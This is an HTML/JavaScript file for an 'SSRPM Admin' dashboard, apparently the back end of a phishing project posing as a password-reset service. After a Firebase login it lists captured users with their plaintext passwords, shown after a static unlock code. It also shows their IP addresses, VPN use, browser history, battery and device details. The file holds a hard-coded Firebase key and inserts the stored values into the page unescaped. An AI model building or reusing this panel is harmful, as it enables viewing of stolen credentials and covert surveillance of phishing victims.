<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Dashboard - SSRPM</title>
  <link rel="shortcut icon" href="../images/favicon.ico" type="image/x-icon" />
  <link rel="icon" href="../images/favicon.ico" type="image/ico" />

  <!-- Optional: keep your original CSS links if they include brand/logo assets -->
  <link href="../css/css.css" rel="stylesheet" />
  <link href="../css/custom.css" rel="stylesheet" type="text/css" />
  <link href="../css/ssrpm.css" rel="stylesheet" type="text/css" />

  <style>
  /* ===== Clean Light Theme (Spinoza) ===== */
  :root{
    --bg:#FFFFFF;
    --surface:#FFFFFF;
    --surface-2:#FAFBFC;
    --text:#0B1220;
    --muted:#5E6A85;
    --line:rgba(11,18,32,0.10);
    --primary:#4A90E2;
    --primary-600:#3B7BC4;
    --success:#2FB36B;
    --danger:#DC3545;
    --shadow-1:0 6px 24px rgba(2,10,24,.06);
    --shadow-2:0 18px 48px rgba(2,10,24,.08);
    --r-lg:16px; --r-md:12px; --r-sm:10px;
    --ring:0 0 0 3px rgba(74,144,226,.28);
  }

  html,body{height:100%}
  body{
    margin:0; background:var(--bg); color:var(--text);
    font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial;
    -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
    position:relative; min-height:100%;
  }

  /* Single subtle corner watermark */
  body::after{
    content:""; position:fixed; right:24px; bottom:24px; width:160px; height:160px; pointer-events:none; z-index:0;
    background:url('../images/spinoza-logo.svg') center/contain no-repeat;
    opacity:.06; filter:grayscale(100%);
  }

  .topbar{position:sticky; top:0; z-index:50; backdrop-filter:saturate(140%) blur(8px);
    background:rgba(255,255,255,.92); border-bottom:1px solid var(--line); box-shadow:0 4px 16px rgba(2,10,24,.06);}
  .topbar-inner{display:flex; align-items:center; justify-content:space-between; padding:14px 24px; max-width:1200px; margin:0 auto;}
  .brand{display:flex; align-items:center; gap:10px}
  .brand-logo{width:36px; height:36px; border-radius:12px; background:linear-gradient(135deg, var(--primary), #86B9F1)}
  .brand-title{font-weight:800; letter-spacing:.2px}
  .muted{color:var(--muted); font-size:13.5px}

  .container{max-width:1200px; margin:0 auto; padding:24px}
  .center-wrap{min-height:calc(100dvh - 72px); display:grid; place-items:center; padding:32px 16px}

  .auth-card{width:100%; max-width:520px; background:var(--surface); border:1px solid var(--line); border-radius:var(--r-lg); box-shadow:var(--shadow-2); padding:28px}
  .auth-head{display:flex; align-items:center; gap:14px; margin-bottom:18px}
  .auth-icon{width:44px; height:44px; border-radius:12px; background:linear-gradient(135deg, var(--primary), #86B9F1)}
  .auth-title{font-size:22px; font-weight:800; margin:0}

  .field{display:grid; gap:8px; margin-top:14px}
  label{color:var(--muted); font-weight:600; font-size:13px}
  .input{background:#fff; border:1px solid var(--line); color:var(--text); border-radius:var(--r-md); padding:12px 14px; outline:0; transition:box-shadow .15s, border-color .15s; width:100%}
  .input:focus{box-shadow:var(--ring); border-color:var(--primary)}
  .btn{appearance:none; border:0; cursor:pointer; user-select:none; text-decoration:none; padding:12px 16px; border-radius:var(--r-md); font-weight:700; letter-spacing:.2px; transition:transform .02s, box-shadow .15s, background .2s; display:inline-flex; align-items:center; justify-content:center; gap:8px}
  .btn:active{transform:translateY(1px)}
  .btn-primary{background:linear-gradient(135deg, var(--primary), #86B9F1); color:#0B1220; box-shadow:var(--shadow-1)}
  .btn-primary:hover{filter:brightness(1.06)}
  .btn-ghost{background:#fff; color:var(--text); border:1px solid var(--line)}
  .btn-ghost:hover{background:#F7FBFF}
  .btn-danger{background:linear-gradient(135deg, #DC3545, #F16A76); color:#fff; box-shadow:var(--shadow-1)}
  .btn-row{display:flex; gap:10px; flex-wrap:wrap; margin-top:16px}

  .progress-shell{height:8px; background:#F3F6FA; border-radius:999px; border:1px solid var(--line); overflow:hidden; margin:10px 0 6px}
  .progress-bar{height:100%; width:38%; background:linear-gradient(90deg, var(--primary), #86B9F1)}

  .grid{display:grid; grid-template-columns:1.2fr .8fr; gap:22px}
  @media (max-width:980px){.grid{grid-template-columns:1fr}}

  .card{background:var(--surface); border:1px solid var(--line); border-radius:var(--r-lg); box-shadow:var(--shadow-1); padding:20px}
  .dash-head{display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:12px}
  .search{display:flex; gap:10px}

  .list{display:grid; gap:10px}
  .user-item{background:var(--surface-2); border:1px solid var(--line); padding:14px 14px; border-radius:var(--r-md); display:grid; grid-template-columns:1fr auto; gap:8px; align-items:center; cursor:pointer; transition:border-color .15s, box-shadow .15s, transform .05s, background .2s}
  .user-item:hover{background:#fff; box-shadow:var(--shadow-1); border-color:rgba(74,144,226,.25)}
  .user-item.selected{outline:0; box-shadow:var(--ring); border-color:var(--primary)}
  .user-name{font-weight:700}
  .timestamp{color:var(--muted); font-size:12px}

  .details .row{display:grid; gap:12px}
  .detail{border-bottom:1px dashed var(--line); padding-bottom:10px}
  .detail:last-child{border-bottom:0; padding-bottom:0}
  .detail label{display:block; color:var(--muted); font-size:12px; margin-bottom:6px}
  .detail .val{word-break:break-word}

  .password-field{background:#F2F5FA; color:#F2F5FA; border:1px solid var(--line); padding:10px 12px; border-radius:var(--r-sm); font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; display:inline-block; min-width:120px; user-select:none; cursor:pointer}
  .password-field.revealed{color:var(--text); background:#fff; border-color:rgba(11,18,32,.18)}
  .unlock{display:flex; gap:8px; margin-top:8px}
  .unlock .input{padding:10px 12px}
</style>

  <!-- Firebase SDK -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut, sendSignInLinkToEmail, isSignInWithEmailLink, signInWithEmailLink } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js";
    import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyClpvIHEe98giJTQxO-bNbUci0i4LOmj3U",
      authDomain: "project34-baebd.firebaseapp.com",
      projectId: "project34-baebd",
      storageBucket: "project34-baebd.firebasestorage.app",
      messagingSenderId: "92418567493",
      appId: "1:92418567493:web:6d51d4af2b66ed14c3e22c"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);

    // Auth state
    onAuthStateChanged(auth, (user) => {
      if (user) {
        showDashboard();
      } else {
        showLoginForm();
      }
    });

    // Login (password)
    window.loginUser = async function () {
      const email = document.getElementById('email')?.value?.trim();
      const password = document.getElementById('password')?.value;
      try { await signInWithEmailAndPassword(auth, email, password); }
      catch (error) { alert('Login mislukt: ' + error.message); }
    }

    // Email-link (passwordless)
    window.sendLoginLink = async function () {
      const email = document.getElementById('email')?.value?.trim();
      if (!email) { alert('Vul je email in.'); return; }
      try {
        const actionCodeSettings = { url: window.location.href, handleCodeInApp: true };
        await sendSignInLinkToEmail(auth, email, actionCodeSettings);
        window.localStorage.setItem('emailForSignIn', email);
        alert('Login link verzonden. Controleer je email.');
      } catch (e) { alert('Kon geen login link versturen: ' + e.message); }
    }

    // Complete sign-in if link opened
    if (isSignInWithEmailLink(auth, window.location.href)) {
      let email = window.localStorage.getItem('emailForSignIn');
      if (!email) email = window.prompt('Bevestig je email voor login');
      signInWithEmailLink(auth, email, window.location.href)
        .then(() => { window.localStorage.removeItem('emailForSignIn'); })
        .catch(err => alert('Email link login mislukt: ' + err.message));
    }

    // Login view
    function showLoginForm() {
      document.body.innerHTML = `
        <header class="topbar">
          <div class="topbar-inner">
            <div class="brand">
              <div class="brand-logo"></div>
              <div>
                <div class="brand-title">SSRPM Admin</div>
                <div class="muted">Beheerportaal • secure access</div>
              </div>
            </div>
            <div class="muted">v1.0</div>
          </div>
        </header>

        <main class="center-wrap">
          <section class="auth-card" role="dialog" aria-labelledby="auth-title">
            <div class="auth-head">
              <div class="auth-icon" aria-hidden="true"></div>
              <div>
                <h1 id="auth-title" class="auth-title">Admin Login Portal</h1>
                <p class="muted">Log in met je beheerdersaccount of ontvang een magic link.</p>
              </div>
            </div>

            <div class="progress-shell" aria-hidden="true"><div class="progress-bar"></div></div>

            <div class="field">
              <label for="email">Email</label>
              <input id="email" type="email" class="input" placeholder="naam@voorbeeld.nl" autofocus />
            </div>
            <div class="field">
              <label for="password">Wachtwoord</label>
              <input id="password" type="password" class="input" placeholder="••••••••" />
            </div>
            <div class="btn-row">
              <button class="btn btn-ghost" onclick="window.location.href='https://sgdcproject34.github.io/project34-spinoza/'">Terug</button>
              <button class="btn btn-primary" onclick="loginUser()">Inloggen</button>
              <button class="btn btn-ghost" onclick="sendLoginLink()">Stuur login link</button>
            </div>
          </section>
        </main>
      `;
    }

    // Dashboard view
    async function showDashboard() {
      try {
        const usersSnapshot = await getDocs(query(collection(db, 'users'), orderBy('timestamp', 'desc')));
        const users = [];
        usersSnapshot.forEach((doc) => users.push({ id: doc.id, ...doc.data() }));

        const rows = users.map(u => {
          const ts = (u.timestamp && typeof u.timestamp.toDate === 'function') ? new Date(u.timestamp.toDate()) : null;
          const tsText = ts ? ts.toLocaleString() : '—';
          const name = (u.username || 'Onbekend');
          return `
            <div class="user-item" onclick="selectUser(event, '${u.id}')">
              <div class="user-name">${name}</div>
              <div class="timestamp">${tsText}</div>
            </div>`
        }).join('');

        document.body.innerHTML = `
          <header class="topbar">
            <div class="topbar-inner">
              <div class="brand">
                <div class="brand-logo"></div>
                <div>
                  <div class="brand-title">SSRPM Admin</div>
                  <div class="muted">Gebruikersbeheer</div>
                </div>
              </div>
              <div class="btn-row"><button class="btn btn-danger" onclick="logout()">Uitloggen</button></div>
            </div>
          </header>

          <main class="container">
            <div class="grid">
              <section class="card">
                <div class="dash-head">
                  <h2 style="margin:0">Gebruikers</h2>
                  <div class="search">
                    <input id="searchInput" class="input" placeholder="Zoek gebruikersnaam…" />
                  </div>
                </div>
                <div class="list" id="usersList">${rows}</div>
              </section>

              <aside class="card details" id="userDetails" style="position:sticky; top:16px; height: fit-content;">
                <div class="dash-head"><h3 style="margin:0">Details</h3></div>
                <div id="userInfo" class="row muted">Selecteer een gebruiker…</div>
              </aside>
            </div>
          </main>
        `;

        // Search functionality
        document.getElementById('searchInput').addEventListener('input', (e) => {
          const q = e.target.value.toLowerCase();
          document.querySelectorAll('.user-item').forEach(el => {
            const name = el.querySelector('.user-name')?.textContent?.toLowerCase() || '';
            el.style.display = name.includes(q) ? 'grid' : 'none';
          });
        });

        // Store users globally
        window.usersData = users;
      } catch (error) {
        console.error('Error loading dashboard:', error);
        alert('Fout bij laden dashboard: ' + error.message);
      }
    }

    // Select user
    window.selectUser = function (ev, userId) {
      const user = window.usersData.find(u => u.id === userId);
      if (!user) return;

      document.querySelectorAll('.user-item').forEach(i => i.classList.remove('selected'));
      ev.currentTarget.classList.add('selected');

      const userInfo = document.getElementById('userInfo');
      const ts = (user.timestamp && typeof user.timestamp.toDate === 'function') ? new Date(user.timestamp.toDate()).toLocaleString() : '—';

      userInfo.innerHTML = `
        <div class="detail"><label>Gebruikersnaam</label><div class="val">${user.username || 'Niet beschikbaar'}</div></div>
        <div class="detail">
          <label>Wachtwoord</label>
          <div class="password-field" id="password-${userId}" onclick="togglePassword('${userId}')">••••••••</div>
          <div class="unlock hidden" id="unlock-${userId}">
            <input type="password" class="input" placeholder="Code invoeren" id="unlockCode-${userId}" />
            <button class="btn btn-primary" onclick="unlockPassword('${userId}')">Ontgrendelen</button>
          </div>
        </div>
        <div class="detail"><label>VPN gebruikt</label><div class="val">${user.vpnUsed === true ? 'Ja' : (user.vpnUsed === false ? 'Nee' : 'Onbekend')}</div></div>
        <div class="detail"><label>IP-adres</label><div class="val">${user.ipAddress || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>Server Locatie</label><div class="val">${user.serverLocation || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>User-Agent</label><div class="val">${user.userAgent || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>Besturingssysteem</label><div class="val">${user.operatingSystem || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>Schermgrootte</label><div class="val">${user.screenSize || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>Taal</label><div class="val">${user.language || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>Tijdzone</label><div class="val">${user.timezone || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>Batterij</label><div class="val">${user.battery || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>Browser History</label><div class="val">${user.browserHistory || 'Niet beschikbaar'}</div></div>
        <div class="detail"><label>Timestamp</label><div class="val">${ts}</div></div>
      `;
    }

    // Toggle password field (show unlock)
    window.togglePassword = function (userId) {
      const el = document.getElementById('unlock-' + userId);
      if (!el) return;
      el.classList.toggle('hidden');
    }

    // Unlock password (DEMO: static code)
    window.unlockPassword = function (userId) {
      const code = document.getElementById('unlockCode-' + userId)?.value;
      if (code === '9461') {
        const user = window.usersData.find(u => u.id === userId);
        const field = document.getElementById('password-' + userId);
        field.textContent = user.password || 'Niet beschikbaar';
        field.classList.add('revealed');
        document.getElementById('unlock-' + userId).classList.add('hidden');
      } else {
        alert('Onjuiste code!');
      }
    }

    // Logout
    window.logout = function () { signOut(auth); }
  </script>
</head>
<body>
  <!-- Content dynamically injected by JS -->
</body>
</html>

